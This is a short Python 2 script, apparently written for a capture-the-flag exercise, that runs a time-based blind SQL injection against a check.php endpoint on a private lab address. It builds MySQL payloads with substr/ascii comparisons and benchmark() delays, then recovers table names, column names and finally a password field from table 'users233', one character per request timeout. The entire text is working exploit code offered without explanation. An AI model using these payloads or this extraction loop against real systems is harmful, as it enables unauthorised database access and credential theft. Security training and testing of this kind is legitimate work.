import requests
payload1='''1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1} and benchmark(100000000000000,md5("123")) and '1'='1'''
payload2='''1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="users233"),{0},1))={1} and benchmark(100000000000000,md5("123")) and '1'='1'''
payload='''1'and ascii(substr((select group_concat(P4sSwo3d) from users233 where 1=1 limit 1 ),{0},1))={1} and benchmark(100000000000000,md5("123")) and '1'='1'''
# users233
url="http://10.21.13.154:20001/check.php"
flag="";
for i in xrange(0,100):
    for x in xrange(48, 128):
        try:
            tmp = payload.format(i, x)

            data = {
                'id': tmp
            }
            res = requests.post(url=url, data=data,timeout=1)
        except requests.exceptions.ReadTimeout:
            flag+=chr(x);
            print flag
            break;
print flag